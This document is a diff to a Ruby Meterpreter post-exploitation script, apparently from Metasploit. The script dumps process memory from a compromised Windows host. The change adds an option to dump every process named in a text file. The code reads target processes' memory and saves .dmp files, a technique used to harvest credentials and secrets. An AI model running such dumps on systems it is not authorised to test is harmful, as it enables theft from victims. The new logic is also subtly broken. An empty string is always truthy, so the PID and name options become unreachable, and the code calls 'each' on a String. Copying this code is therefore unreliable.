@@ -9,11 +9,12 @@ require 'fileutils'
 pid = nil
 name = nil
 toggle = nil
-process_match = nil
+resource = ""
 opts = Rex::Parser::Arguments.new(
 	"-h" => [ false, "Help menu." ],
 	"-p" => [ true, "PID of process to dump."],
 	"-n" => [ true, "Name of process to dump."],
+	"-r" => [ true, "Text file wih list of process names to dump memory for, one per line."],
 	"-t" => [ false, "toggle location information in dump."]
 )
 
@@ -32,8 +33,15 @@ opts.parse(args) { |opt, idx, val|
 		name = val
 	when "-t"
 		toggle = true
-	else
-		process_match = val
+	when "-r"
+                list = val
+                if not ::File.exists?(list)
+                        raise "Command List File does not exists!"
+                else
+                        ::File.open(list, "r").each_line do |line|
+                                resource << line
+                        end
+                end
 	end
 }
 
@@ -70,7 +78,7 @@ def dump_mem(pid,name, toggle)
 	::FileUtils.mkdir_p(logs)
 	#Dump file name
 	dumpfile = logs + ::File::Separator + host + filenameinfo + ".dmp"
-	print_status("Dumping Memory of with PID: #{pid.to_s}")
+	print_status("\tDumping Memory of #{name} with PID: #{pid.to_s}")
 	begin
 		dump_process = client.sys.process.open(pid.to_i, PROCESS_READ)
 	rescue
@@ -94,7 +102,19 @@ def dump_mem(pid,name, toggle)
 	file_local_write(dumpfile,dump)
 end
 if client.platform =~ /win32|win64/
-	if pid
+	if resource
+		resource.each do |r|
+			print_status("Dumping memory for #{r.chomp}")
+			pids = find_pids(r.chomp)
+			if pids.length == 0
+				print_status("\tProcess #{r.chomp} not found!")
+				next
+			end
+			pids.each do |p|
+				dump_mem(p,r.chomp,toggle)
+			end
+		end
+	elsif pid
 		proc_name = find_procname(pid)
 		print_status("Dumping memory for #{proc_name}")
 		dump_mem(pid,proc_name,toggle)
